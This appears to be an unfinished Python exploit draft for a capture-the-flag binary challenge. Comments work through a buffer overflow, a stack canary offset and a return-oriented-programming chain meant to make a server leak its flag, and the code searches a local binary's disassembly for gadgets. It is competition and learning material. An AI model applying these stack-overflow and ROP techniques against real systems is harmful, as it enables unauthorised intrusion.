import socket
import ssl
import time

HOST = "2b4446b928232a49.julec.tf"
PORT = 1337

CANARY = b"\x00" * 8
BUF_TO_CANARY = 40

# At 0x40163e: mov %eax,%edi (loads socket FD into edi)
# At 0x401640: call print_intro (CLOBBERS rdi)
# At 0x401645: jmp 401648 (after print_intro)
# 
# Strategy: Return to 0x40163e to reload socket FD into edi,
# then jump directly to load_flag_to_location

# Actually, let's use a ROP chain:
# 1. Return to 0x40163b (mov -0x54(%rbp),%eax; mov %eax,%edi)
#    This loads socket FD from stack into edi
# 2. Then jump to load_flag_to_location

# But wait, rbp is fake after overflow. Let me think...
# 
# Better approach: The socket FD is saved at [rbp-0x54] in greet_user.
# After overflow, rbp is fake, so we can't rely on it.
#
# WAIT! What if I just return to an address that sets edi to a known value?
# Or... what if the socket FD is ALWAYS 4 in the fork model?

# Let me try the simplest thing: assume FD=4 and use a gadget to set it
# We have: pop rbp; ret at 0x40141d
# Can we find: pop rdi; ret? No, we confirmed it doesn't exist.
#
# Alternative: Can we find a gadget that moves a known value into rdi?
# Like: mov $4, %edi; ret?

# Let me search for this pattern
import subprocess
result = subprocess.run(
    ["objdump", "-d", "main2"],
    capture_output=True,
    text=True
)

# Search for "mov.*0x4.*edi" or similar
for line in result.stdout.split('\n'):
    if 'mov' in line and 'edi' in line and ('$0x4' in line or '$4' in line):
        print(line)

print("\n=== Searching for useful gadgets ===")
